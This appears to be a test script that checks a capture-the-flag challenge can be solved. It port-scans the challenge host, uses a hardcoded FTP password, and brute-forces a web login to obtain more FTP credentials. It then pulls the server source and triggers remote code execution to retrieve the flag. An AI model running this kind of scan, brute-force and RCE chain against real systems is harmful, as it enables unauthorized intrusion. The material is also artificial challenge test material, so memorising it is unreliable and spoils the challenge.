#!/usr/bin/env bash

set -euo pipefail

cd /chaltest_solver
sudo apt-get -y install nmap ftp nodejs

echo "Testing original ftp-conn binary..."
./ftp-conn | grep -Fe '[+] Successful Ftp Login' || \
    (echo "ftp-conn binary failed" && exit 1)

ftp_base_user="ftp_base"
ftp_base_pass="r5TgKiP18L1VwuX0K0JZEX7V4j31wh"
echo "Testing ftp_base credentials"
wget -q -O- --user="$ftp_base_user" --password="$ftp_base_pass" ftp://128.238.66.77/note.txt

echo "Checking open ports..."
(nmap -n 128.238.66.77 | tee nmap_out.txt ; \
    grep -qFe "3000/tcp" nmap_out.txt && \
    grep -qFe "8000/tcp" nmap_out.txt && \
    grep -qFe "21/tcp" nmap_out.txt && \
    rm -f nmap_out.txt) || \
    (echo "nmap failed" && exit 1)

echo "Testing brute-force script..."
web_pass="$(python solver.py)"
echo "Found web password: $web_pass"

echo "Getting ftp_dev credentials..."
ftp_dev_creds=$(curl -f -s -H "Content-Type: application/json" \
    --data '{"username":"user","password":"'"$web_pass"'"}' \
    http://128.238.66.77:3000/login | jq -r .msg)
ftp_dev_user=$(echo "$ftp_dev_creds" | cut -d: -f1)
ftp_dev_pass=$(echo "$ftp_dev_creds" | cut -d: -f2)
echo "Got user $ftp_dev_user password $ftp_dev_pass"

# Try to grab the server source
echo "Testing ftp_dev credentials..."
(
    mkdir server_src  &&
    cd server_src &&
    wget -qr -nH -nc --user="$ftp_dev_user" --password="$ftp_dev_pass" ftp://128.238.66.77/ &>/dev/null &&
    grep -qFe "function safeT" index.js &&
    cd .. &&
    rm -rf server_src
) || (echo "get ftp_dev failed" && exit 1)

echo "Using RCE to put the flag in res.txt on the server..."
curl -f --get --data-urlencode t="$(node encryption_solver.js)" "http://128.238.66.77:3000/issueRateLimit" &> /dev/null

echo "All done, flag is:"
wget -q --user="$ftp_dev_user" --password="$ftp_dev_pass" ftp://128.238.66.77/res.txt &>/dev/null
cat res.txt
rm -f res.txt
